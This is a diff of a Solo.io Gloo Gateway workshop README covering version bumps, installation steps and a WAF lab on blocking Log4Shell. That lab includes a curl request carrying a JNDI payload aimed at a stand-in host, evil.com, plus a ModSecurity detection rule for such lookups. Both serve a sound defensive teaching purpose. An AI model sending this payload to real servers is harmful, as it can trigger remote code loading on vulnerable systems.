@@ -40,7 +40,7 @@ To get started with this workshop, clone this repo.
 
 ```sh
 git clone https://github.com/solo-io/solo-cop.git
-cd solo-cop/workshops/gloo-gateway && git checkout v1.1.2
+cd solo-cop/workshops/gloo-gateway
 ```
 
 Set these environment variables which will be used throughout the workshop.
@@ -48,12 +48,12 @@ Set these environment variables which will be used throughout the workshop.
 ```sh
 # Used to enable Gloo Gateway (please ask for a trail license key)
 export GLOO_GATEWAY_LICENSE_KEY=<licence_key>
-export GLOO_PLATFORM_VERSION=v2.1.0-beta13
+export GLOO_PLATFORM_VERSION=v2.1.0-rc3
 
 # Istio version information
 export ISTIO_IMAGE_REPO=us-docker.pkg.dev/gloo-mesh/istio-workshops
-export ISTIO_IMAGE_TAG=1.13.5-solo
-export ISTIO_VERSION=1.13.5
+export ISTIO_IMAGE_TAG=1.15.1-solo
+export ISTIO_VERSION=1.15.1
 ```
 
 ## Lab 1 - Configure/Deploy a Kubernetes cluster <a name="Lab-1"></a>
@@ -98,6 +98,24 @@ meshctl version
 ```sh
 meshctl install --license $GLOO_GATEWAY_LICENSE_KEY --register --version $GLOO_PLATFORM_VERSION
 ```
+4. Check the installation to verify it's healthy
+```sh
+meshctl check
+```
+You should see something similar to the following
+```sh
+Checking Gloo Mesh Management Cluster Installation
+--------------------------------------------
+
+🟢 Gloo Mgmt Server Deployment Status
+
+🟢 Gloo Mgmt Server Connectivity to Agents
++--------------+------------+--------------------------------------------------+
+|   CLUSTER    | REGISTERED |                  CONNECTED POD                   |
++--------------+------------+--------------------------------------------------+
+| mgmt-cluster | true       | gloo-mesh/gloo-mesh-mgmt-server-6464cf4b99-8lfxj |
++--------------+------------+--------------------------------------------------+
+```
 
 ## Lab 3 - Deploy Gloo API Gateway<a name="Lab-3"></a>
 
@@ -114,12 +132,12 @@ export PATH=$PWD/istio-${ISTIO_VERSION}/bin:$PATH
 istioctl version
 ```
 
-2. Install Gloo API gateway into the `gloo-gateway` namespace. We are using the istioctl utility to install Gloo API Gateway the same way you would install Istio Ingress Gateway. 
+2. Install Gloo API gateway into the `gloo-gateway` namespace. We are using the Gloo Mesh `GatewayLifecycleManager` to install Istio Ingress Gateway. 
 
 ```sh
-kubectl create namespace gloo-gateway
+kubectl create ns gloo-gateway
 kubectl label namespace gloo-gateway istio-injection=enabled
-istioctl install -y --set hub=$ISTIO_IMAGE_REPO --set tag=$ISTIO_IMAGE_TAG -f install/gloo-gateway/install.yaml
+kubectl apply -f install/gloo-gateway/gm-gateway.yaml
 ```
 
 3. Wait for the Gloo Gateway LoadBalancer to become ready
@@ -356,7 +374,7 @@ spec:
 EOF
 ```
 
-The currencyservice converts units from one currency to another. Test the currencyservice by using the `grpcurl` utility to send traffic:
+The currencyservice converts units from one currency to another. Test the currencyservice by using the [`grpcurl`](https://github.com/fullstorydev/grpcurl/releases) utility to send traffic:
 
 ```sh
 grpcurl --plaintext --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY:80 hipstershop.CurrencyService/Convert
@@ -476,7 +494,7 @@ Gloo Gateway utilizes OWASP ModSecurity to add WAF features into the ingress gat
 In this section of the lab, take a quick look at how to prevent the `log4j` exploit that was discovered in late 2021. For more details, you can review the [Gloo Edge blog](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/) that this implementation is based on.
 
 1. Refer to following diagram from Swiss CERT to learn how the `log4j` attack works. Note that a JNDI lookup is inserted into a header field that is logged.
-![log4j exploit](./images/log4j_attack.png)
+![log4j exploit](images/log4j_attack.png)
 
 2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
@@ -490,7 +508,7 @@ curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
 * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
 
 ```yaml
-kubectl apply -f - <<EOF
+kubectl apply -f - <<'EOF'
 apiVersion: security.policy.gloo.solo.io/v2
 kind: WAFPolicy
 metadata:
@@ -505,11 +523,11 @@ spec:
     disableCoreRuleSet: true
     customInterventionMessage: 'Log4Shell malicious payload'
     customRuleSets:
-    - ruleStr: |
+    - ruleStr: |-
         SecRuleEngine On
         SecRequestBodyAccess On
-        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
-          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
+        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
+          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://"
           "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
 EOF
 ```
